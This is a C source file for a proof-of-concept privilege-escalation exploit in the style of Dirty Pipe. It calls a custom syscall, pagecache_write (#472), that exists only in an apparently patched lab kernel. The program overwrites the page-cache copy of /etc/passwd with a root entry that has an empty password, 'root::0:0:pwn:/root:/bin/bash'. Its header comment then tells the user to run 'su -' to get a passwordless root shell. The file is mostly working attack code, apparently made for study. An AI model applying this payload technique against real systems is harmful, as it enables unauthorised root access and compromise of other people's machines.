// SPDX-License-Identifier: GPL-2.0
/*
 * dirty-pagecache: userspace driver for the pagecache_write(472) syscall.
 *
 * Demonstrates a Dirty-Pipe-style primitive: as an unprivileged user
 * ("hacker") we corrupt the page cache of /etc/passwd so that subsequent
 * cache reads see a passwordless root entry. The on-disk file is NEVER
 * modified; reboot restores the original.
 *
 *   build:  make
 *   run:    ./dirty-pagecache              # default target /etc/passwd
 *           ./dirty-pagecache /tmp/foo     # any regular file
 *
 * Verify after running:
 *   head -1 /etc/passwd       # see corrupted first line
 *   su -                      # become root with no password
 *   sync; echo 3 > /proc/sys/vm/drop_caches   # cache reset = original back
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>

#ifndef __NR_pagecache_write
#define __NR_pagecache_write 472
#endif

static long pagecache_write(const char *path, off_t offset,
			    const void *buf, size_t len)
{
	return syscall(__NR_pagecache_write, path, offset, buf, len);
}

int main(int argc, char **argv)
{
	const char *target = (argc > 1) ? argv[1] : "/etc/passwd";

	/*
	 * Replacement for the start of /etc/passwd.
	 *  - "root::" = empty password field, so PAM/su require no password
	 *  - 0:0     = uid/gid root
	 *  - shell   = /bin/bash
	 *
	 * We deliberately DO NOT include a trailing NUL in the write -- the
	 * page cache holds the file as a byte stream, not a C string.
	 */
	const char payload[] = "root::0:0:pwn:/root:/bin/bash\n";
	size_t len = sizeof(payload) - 1;

	printf("[*] target file   : %s\n", target);
	printf("[*] payload (%zu B): %.*s", len, (int)len, payload);
	printf("[*] my uid before : %d\n", getuid());

	long ret = pagecache_write(target, 0, payload, len);
	if (ret < 0) {
		fprintf(stderr, "[!] pagecache_write failed: %s (errno=%d)\n",
			strerror(errno), errno);
		fprintf(stderr,
			"    Did you boot the patched kernel?\n"
			"    Is syscall #%d defined?\n",
			__NR_pagecache_write);
		return 1;
	}

	printf("[+] wrote %ld bytes into the page cache of %s\n", ret, target);
	printf("[+] disk contents UNCHANGED. Verify with:\n");
	printf("       head -1 %s\n", target);
	printf("       su -\n");
	return 0;
}
